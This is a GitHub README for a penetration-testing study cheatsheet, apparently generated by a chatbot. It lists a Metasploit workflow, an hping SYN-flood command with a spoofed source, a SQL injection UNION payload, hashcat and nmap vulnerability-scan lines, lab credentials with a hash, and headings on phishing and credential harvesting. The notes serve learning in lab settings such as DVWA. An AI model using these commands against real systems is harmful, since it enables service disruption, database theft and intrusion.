# piedPiper
Here’s a `README.md` formatted version of the content from your **VAPT Cheatsheet** document, suitable for a GitHub repository:

---

# VAPT Cheatsheet

This repository contains a summarized guide and commonly used commands for Vulnerability Assessment and Penetration Testing (VAPT). It includes reconnaissance tools, exploitation strategies, social engineering, SQL injection, password cracking, and more.

---

## 🔍 Reconnaissance

### Tools:
- **EtterCap**
   - Find IPs
- **Wireshark**
- **Nmap**  
  - Find IPs  
  - Discover Open Ports  
  - Identify Version Info  

---

## ⚔️ Exploitation

### Tools:
- **Metasploit Framework**

### Typical Workflow:
```bash
msfconsole
search <port name with version>
use <index of module>
show options
set RHOST <target-ip>
set LHOST <your-ip>
set PAYLOAD <payload-type>  # if needed
run
```

### Unprotected Ports List:
```
20/21  - FTP  
23     - Telnet  
25     - SMTP  
53     - DNS  
80     - HTTP  
110    - POP3  
389    - LDAP  
445    - SMB  
8080   - HTTP Proxy  
3389   - RDP  
```

---

## 🐚 FTP Attack Example
> Hacking with Reverse Shell — *Part 2* by Praful Nair

---

## 🎭 Social Engineering

### Toolkit:
- **SET (Social Engineering Toolkit)**

### Examples:
- Credential Harvesting using Kali Linux  
- PowerShell Reverse Shell via SET  
- Write and send phishing emails

---

## 💥 DoS / DDoS Attacks

### Tools:
- **EtterCap**
- **Wireshark**
- **Nmap**
- **hping**
```bash
hping -S <target-ip> -a <spoofed-host-ip> -p 23 --flood
# -S for SYN flood
# -F -P -U for XMAS scan (FIN, PUSH, URG)
```

---

## 🧪 SQL Injection

### Platforms:
- **WebGoat**
- **DVWA**

### Example Payloads:
```sql
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'#
```

---

## 🔓 Password Cracking

### Tools:
- **John the Ripper**
- **Hydra**
- **Hashcat**
```bash
hashcat -a <attack-mode> -m <hash-mode> <hash-file> /usr/share/wordlists/rockyou.txt
```

---

## 📚 Exam Notes / Misc

```bash
# Nmap Example
nmap -p 80,8180,10000 --script=http-enum,http-title,http-headers 192.168.161.137 | grep "controlpanel"

# Vulnerability Scan
nmap -p 21 --script vuln 192.168.161.137

# Metasploit usage
msfconsole
search
show options
set RHOST <target-ip>

# John the Ripper usage
john --show pass.txt
nano pass.txt

# Example Credentials:
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
Username:Password => msfadmin:msfadmin
```

---

## 📁 Resources
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [DVWA](http://www.dvwa.co.uk/)
- [Kali Linux Tools](https://tools.kali.org/)

---

Let me know if you want this as a downloadable `README.md` file.
